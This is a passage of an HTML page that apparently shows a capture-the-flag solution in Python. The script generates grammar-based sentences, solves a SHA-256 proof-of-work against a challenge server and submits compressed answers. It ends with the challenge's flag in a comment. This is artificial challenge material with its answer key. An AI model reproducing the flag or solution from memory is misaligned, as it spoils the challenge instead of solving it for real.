+            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(_<span class="hljs-built_in">dict</span>[el][<span class="hljs-string">&#x27;expCnt&#x27;</span>]):
+                target_sentence = target_sentence.replace(<span class="hljs-string">&#x27; e &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span> + _<span class="hljs-built_in">dict</span>[usefulexpIdx][<span class="hljs-string">&#x27;sentence&#x27;</span>] + <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">1</span>)
+            ans.append(target_sentence)
+    <span class="hljs-comment"># use random to generate least sentence</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>((<span class="hljs-number">150</span> - <span class="hljs-built_in">len</span>(miss))):
+        record = <span class="hljs-built_in">set</span>()
+        tot = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(record) &lt; <span class="hljs-number">20</span>:
+            record = <span class="hljs-built_in">set</span>()
+            tot = <span class="hljs-number">0</span>
+            sentence, tot = add_statement(_<span class="hljs-built_in">dict</span>[random.randint(<span class="hljs-number">50</span>,<span class="hljs-number">149</span>)], _<span class="hljs-built_in">dict</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27; s &#x27;</span>, <span class="hljs-number">0</span>)
+            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27; e&#x27;</span> <span class="hljs-keyword">in</span> sentence) <span class="hljs-keyword">or</span> (<span class="hljs-string">&#x27; s&#x27;</span> <span class="hljs-keyword">in</span> sentence):
+                tot = <span class="hljs-number">0</span>
+                record = <span class="hljs-built_in">set</span>()
+            <span class="hljs-keyword">elif</span>  record <span class="hljs-keyword">in</span> table:
+                tot = <span class="hljs-number">0</span>
+                record = <span class="hljs-built_in">set</span>()
+        table.append(record)
+        big_record = big_record.union(record)
+        ans.append(sentence[<span class="hljs-number">1</span>:])
+
+    <span class="hljs-keyword">return</span> ans
+    
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    y = remote(<span class="hljs-string">&#x27;121.5.253.92&#x27;</span>,<span class="hljs-number">10001</span>)
+    msg = y.recvline()
+    <span class="hljs-comment"># solve sha256</span>
+    answer = solve_sha256(msg)
+    y.sendlineafter(<span class="hljs-string">&#x27;XXXX:&#x27;</span>, answer)
+    msg = y.recvuntil(<span class="hljs-string">&#x27;EOF&#x27;</span>)
+    <span class="hljs-comment"># parse rule to _dict</span>
+    _<span class="hljs-built_in">dict</span> = parse_rule(_<span class="hljs-built_in">dict</span>, msg.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))
+    <span class="hljs-comment"># solving...</span>
+    ans = solve(_<span class="hljs-built_in">dict</span>)
+    <span class="hljs-comment"># change ans to remote format</span>
+    ans = <span class="hljs-string">b&#x27;|&#x27;</span>.join([el.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>) <span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> ans])
+    ans = zlib.compress(ans)
+    length = <span class="hljs-built_in">len</span>(ans)
+    ans = ans.<span class="hljs-built_in">hex</span>()
+    ans = ans.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)
+    y.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>, <span class="hljs-built_in">str</span>(length))
+    y.sendlineafter(<span class="hljs-string">&#x27;code(hex): &#x27;</span>, ans)
+    y.interactive()
+    
+    <span class="hljs-comment"># flag{Di3_G7enzen_mEiNer_5prache_beDeuTeN_dIe_GrenzEn_meinEr_Welt}</span></code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
